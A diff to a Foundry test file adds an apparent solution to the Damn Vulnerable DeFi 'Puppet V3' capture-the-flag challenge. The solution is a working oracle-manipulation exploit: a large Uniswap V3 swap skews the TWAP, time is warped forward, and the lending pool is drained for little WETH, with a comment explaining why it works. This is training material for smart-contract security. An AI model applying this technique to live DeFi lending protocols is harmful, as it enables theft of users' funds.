@@ -10,6 +10,8 @@ import {FixedPointMathLib} from "solmate/utils/FixedPointMathLib.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {INonfungiblePositionManager} from "../../src/puppet-v3/INonfungiblePositionManager.sol";
 import {PuppetV3Pool} from "../../src/puppet-v3/PuppetV3Pool.sol";
+//NOTE (tina): added
+import {ISwapRouter} from "@uniswap/v3-periphery/contracts/interfaces/ISwapRouter.sol";
 
 contract PuppetV3Challenge is Test {
     address deployer = makeAddr("deployer");
@@ -78,6 +80,7 @@ contract PuppetV3Challenge is Test {
             INonfungiblePositionManager.MintParams({
                 token0: token0,
                 token1: token1,
+                //NOTE (tina):  does a razor-thin liquidity range make manipulation easier or harder, and why?
                 tickLower: -60,
                 tickUpper: 60,
                 fee: FEE,
@@ -108,7 +111,7 @@ contract PuppetV3Challenge is Test {
     /**
      * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
      */
-    function test_assertInitialState() public view {
+function test_assertInitialState() public view {
         assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
         assertGt(initialBlockTimestamp, 0);
         assertEq(token.balanceOf(player), PLAYER_INITIAL_TOKEN_BALANCE);
@@ -119,13 +122,41 @@ contract PuppetV3Challenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppetV3() public checkSolvedByPlayer {
+        address uniswapRouterAddress = 0xE592427A0AEce92De3Edee1F18E0157C05861564;
+        token.approve(address(uniswapRouterAddress), type(uint256).max);
+        uint256 quote1 = lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE);
+        console.log("quote1: ", quote1);
+ 
+        ISwapRouter(uniswapRouterAddress).exactInputSingle(
+            ISwapRouter.ExactInputSingleParams(
+                address(token),
+                address(weth),
+                3000,
+                address(player),
+                block.timestamp,
+                PLAYER_INITIAL_TOKEN_BALANCE,
+                0,
+                0
+            )
+        );  
+         vm.warp(block.timestamp + 114);
+        uint256 quote = lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE);
+        weth.approve(address(lendingPool), quote);
+        console.log("quote: ", quote);
+        lendingPool.borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);
+        token.transfer(recovery,LENDING_POOL_INITIAL_TOKEN_BALANCE);
+
+        //this is why the exploit works:  PuppetV3Pool prices collateral off a 10-min Uniswap V3 TWAP,
+        // but a single large swap right before borrowing still skews that average — and warping time
+        // forward (up to the challenge's 115s deadline) increases the crashed price's weight in the
+        // window, pushing the WETH quote low enough to drain the pool for almost nothing.
         
     }
 
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
      */
-    function _isSolved() private view {
+    function _isSolved() private view { 
         assertLt(block.timestamp - initialBlockTimestamp, 115, "Too much time passed");
         assertEq(token.balanceOf(address(lendingPool)), 0, "Lending pool still has tokens");
         assertEq(token.balanceOf(recovery), LENDING_POOL_INITIAL_TOKEN_BALANCE, "Not enough tokens in recovery account");
